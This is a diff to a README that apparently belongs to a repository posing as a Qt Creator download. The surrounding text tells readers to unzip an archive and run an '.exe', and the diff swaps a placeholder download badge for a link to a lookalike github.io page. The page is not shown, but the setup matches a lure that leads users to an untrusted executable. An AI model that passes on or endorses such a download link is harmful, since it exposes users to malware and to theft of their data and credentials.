@@ -13,7 +13,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://qt-creator-download.github.io/.github/)
 
 ## 📸 Overview
   <img width="914" height="692" alt="qtcreator-cpp-development" src="https://github.com/user-attachments/assets/c1acc5a3-b330-4f41-b696-0931eb3b22f5" />
